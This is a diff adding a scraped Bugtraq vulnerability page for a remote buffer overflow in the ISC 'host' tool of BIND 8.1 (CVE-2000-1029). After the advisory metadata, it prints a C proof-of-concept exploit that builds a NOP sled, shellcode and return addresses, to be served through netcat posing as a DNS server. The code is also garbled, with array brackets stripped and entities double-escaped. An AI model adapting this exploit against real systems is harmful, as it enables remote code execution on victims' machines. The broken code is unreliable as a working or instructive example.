@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid1887<p><b><span style="font-size: 18pt;">ISC host Remote Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/1887/info">info</a><br><a href="http://www.securityfocus.com/bid/1887/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/1887/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/1887/solution">solution</a><br><a href="http://www.securityfocus.com/bid/1887/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				1887
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2000-1029<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Oct 27 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 03:56AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Posted to bugtraq by antirez &lt;antirez@linuxcare.com&gt; on Fri, 27 Oct 2000.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					ISC BIND 8.1 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	excerpted from the original bugtraq posting by antirez &amp;lt;antirez@linuxcare.com&amp;gt; on Fri, 27 Oct 2000.<br/><br/>command line:<br/><br/>./host -l -v -t any somezone.org &amp;lt;fake server&amp;gt;<br/><br/>proof of concepts exploit:<br/><br/>/* hostexp.c<br/> * cc hostexp.c -o hostexp<br/> *<br/> * usage: ./hostexp | nc -l -p 53<br/> */<br/><br/>#include &amp;lt;stdio.h&amp;gt;<br/>#include &amp;lt;netinet/in.h&amp;gt;<br/><br/>int main(void)<br/>{<br/>        int offset = 140;<br/>        unsigned int base = 0xbffff74c+offset, i;<br/>        char shellcode = /* 48 bytes, ripped */<br/>        "\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"<br/>        "\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"<br/>        "\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"<br/>        "\xff\xff/bin/ls";<br/>        unsigned short a = htons(1024);<br/>        char buffer1026;<br/><br/>        memcpy(buffer, &amp;amp;a, 2);<br/>        memset(buffer+2, 'A', 100); /* avoid response processing */<br/>        memset(buffer+102, 0x90, 100);<br/>        memcpy(buffer+202, shellcode, 48);<br/>        for (i = 202+48; i &amp;lt; 202+48+600; i+=4)<br/>                memcpy(buffer+i, &amp;amp;base, 4);<br/>        write(fileno(stdout), buffer, 1026);<br/>        return 0;<br/>}
+	
+		<ul>
+</ul>
+</div>
